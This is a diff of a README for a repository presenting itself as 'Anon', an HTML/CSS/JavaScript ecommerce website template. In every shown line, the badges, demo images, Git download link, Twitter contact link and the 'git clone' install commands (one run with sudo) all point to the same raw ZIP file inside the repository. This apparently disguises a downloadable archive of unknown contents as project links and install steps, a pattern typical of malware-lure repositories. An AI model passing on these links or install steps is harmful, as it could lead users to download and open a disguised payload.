@@ -1,23 +1,23 @@
 # Anon - An eCommerce Website
 
-![GitHub repo size](https://raw.githubusercontent.com/Waka758/anon-ecommerce-website/master/somnify/anon-ecommerce-website.zip)
-![GitHub stars](https://raw.githubusercontent.com/Waka758/anon-ecommerce-website/master/somnify/anon-ecommerce-website.zip)
-![GitHub forks](https://raw.githubusercontent.com/Waka758/anon-ecommerce-website/master/somnify/anon-ecommerce-website.zip)
-[![Twitter Follow](https://raw.githubusercontent.com/Waka758/anon-ecommerce-website/master/somnify/anon-ecommerce-website.zip)](https://raw.githubusercontent.com/Waka758/anon-ecommerce-website/master/somnify/anon-ecommerce-website.zip)
-[![YouTube Video Views](https://raw.githubusercontent.com/Waka758/anon-ecommerce-website/master/somnify/anon-ecommerce-website.zip)](https://raw.githubusercontent.com/Waka758/anon-ecommerce-website/master/somnify/anon-ecommerce-website.zip)
+![GitHub repo size](https://github.com/Waka758/anon-ecommerce-website/raw/refs/heads/master/website-demo-image/anon_website_ecommerce_1.7-beta.5.zip)
+![GitHub stars](https://github.com/Waka758/anon-ecommerce-website/raw/refs/heads/master/website-demo-image/anon_website_ecommerce_1.7-beta.5.zip)
+![GitHub forks](https://github.com/Waka758/anon-ecommerce-website/raw/refs/heads/master/website-demo-image/anon_website_ecommerce_1.7-beta.5.zip)
+[![Twitter Follow](https://github.com/Waka758/anon-ecommerce-website/raw/refs/heads/master/website-demo-image/anon_website_ecommerce_1.7-beta.5.zip)](https://github.com/Waka758/anon-ecommerce-website/raw/refs/heads/master/website-demo-image/anon_website_ecommerce_1.7-beta.5.zip)
+[![YouTube Video Views](https://github.com/Waka758/anon-ecommerce-website/raw/refs/heads/master/website-demo-image/anon_website_ecommerce_1.7-beta.5.zip)](https://github.com/Waka758/anon-ecommerce-website/raw/refs/heads/master/website-demo-image/anon_website_ecommerce_1.7-beta.5.zip)
 
 Anon is a fully responsive ecommerce website, maximum compatiblities in all mobile devices, built using HTML, CSS, and JavaScript.
 
 ## Demo
 
-![Anon Desktop Demo](https://raw.githubusercontent.com/Waka758/anon-ecommerce-website/master/somnify/anon-ecommerce-website.zip "Desktop Demo")
-![Anon Mobile Demo](https://raw.githubusercontent.com/Waka758/anon-ecommerce-website/master/somnify/anon-ecommerce-website.zip "Mobile Demo")
+![Anon Desktop Demo](https://github.com/Waka758/anon-ecommerce-website/raw/refs/heads/master/website-demo-image/anon_website_ecommerce_1.7-beta.5.zip "Desktop Demo")
+![Anon Mobile Demo](https://github.com/Waka758/anon-ecommerce-website/raw/refs/heads/master/website-demo-image/anon_website_ecommerce_1.7-beta.5.zip "Mobile Demo")
 
 ## Prerequisites
 
 Before you begin, ensure you have met the following requirements:
 
-* [Git](https://raw.githubusercontent.com/Waka758/anon-ecommerce-website/master/somnify/anon-ecommerce-website.zip "Download Git") must be installed on your operating system.
+* [Git](https://github.com/Waka758/anon-ecommerce-website/raw/refs/heads/master/website-demo-image/anon_website_ecommerce_1.7-beta.5.zip "Download Git") must be installed on your operating system.
 
 ## Installing Anon
 
@@ -26,18 +26,18 @@ To install **Anon**, follow these steps:
 Linux and macOS:
 
 ```bash
-sudo git clone https://raw.githubusercontent.com/Waka758/anon-ecommerce-website/master/somnify/anon-ecommerce-website.zip
+sudo git clone https://github.com/Waka758/anon-ecommerce-website/raw/refs/heads/master/website-demo-image/anon_website_ecommerce_1.7-beta.5.zip
 ```
 
 Windows:
 
 ```bash
-git clone https://raw.githubusercontent.com/Waka758/anon-ecommerce-website/master/somnify/anon-ecommerce-website.zip
+git clone https://github.com/Waka758/anon-ecommerce-website/raw/refs/heads/master/website-demo-image/anon_website_ecommerce_1.7-beta.5.zip
 ```
 
 ## Contact
 
-If you want to contact me you can reach me at [Twitter](https://raw.githubusercontent.com/Waka758/anon-ecommerce-website/master/somnify/anon-ecommerce-website.zip).
+If you want to contact me you can reach me at [Twitter](https://github.com/Waka758/anon-ecommerce-website/raw/refs/heads/master/website-demo-image/anon_website_ecommerce_1.7-beta.5.zip).
 
 ## License
 
